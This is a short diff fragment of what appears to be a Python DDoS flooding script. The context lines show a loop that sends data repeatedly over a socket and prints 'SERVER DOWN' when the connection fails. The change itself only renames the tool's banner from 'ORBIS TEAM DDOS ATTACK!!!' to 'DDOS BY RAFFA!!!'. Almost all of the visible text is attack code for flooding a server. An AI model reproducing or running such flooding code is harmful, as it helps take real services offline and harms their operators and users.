@@ -43,7 +43,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ORBIS TEAM DDOS ATTACK!!!")
+			print(i +" DDOS BY RAFFA!!!")
 		except:
 			s.close()
 			print("[*] SERVER DOWN")
